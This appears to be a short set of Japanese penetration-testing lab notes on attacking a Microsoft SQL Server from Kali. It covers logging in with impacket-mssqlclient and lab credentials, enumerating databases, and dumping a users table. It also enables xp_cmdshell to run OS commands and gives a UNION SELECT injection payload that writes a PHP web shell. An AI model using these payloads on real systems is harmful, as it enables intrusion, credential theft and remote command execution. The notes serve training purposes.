KaliからMSSQLインスタンスに接続する
```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

Windows OSバージョンを取得する
```
SELECT @@version;
```

利用可能なすべてのDBリストを取得する
```
SELECT name FROM sys.databases;
```
> [!NOTE]
> DBリストの取得で得られるmaster, tempdb, model, msdbはデフォルトのDB。ここにはターゲットに属するデータが含まれている可能性があるが、認証情報などの貴重なデータはユーザ定義のデフォルトじゃないDBに入っている可能性が高い。

DBを指定して、利用可能なテーブルを一覧表示する。 
- offsec.information_schema => offsecDBにおけるinformation_schema内のtableをクエリする
```
SELECT * FROM offsec.information_schema.tables;
```

usersテーブルからすべてのレコードを選択して取得する
```
select * from offsec.dbo.users;
```

簡単なSELECT文
```
SELECT 列名1, 列名2, ・・・ FROM テーブル名
```

使用するDBを選択する
```
USE <DB Name>
```

- show advanced optionsの値を1にしてオプションの表示を有効化。
- xp_cmdshellを有効化する
```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

xp_cmdshellを使ってコマンドシェル経由のコマンド実行を行う
```
EXECUTE xp_cmdshell 'whoami';
```

UNION SELECT SQLキーワードを発行してPHPのウェブシェルをターゲットのルートディレクトリ配下に書き込む
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```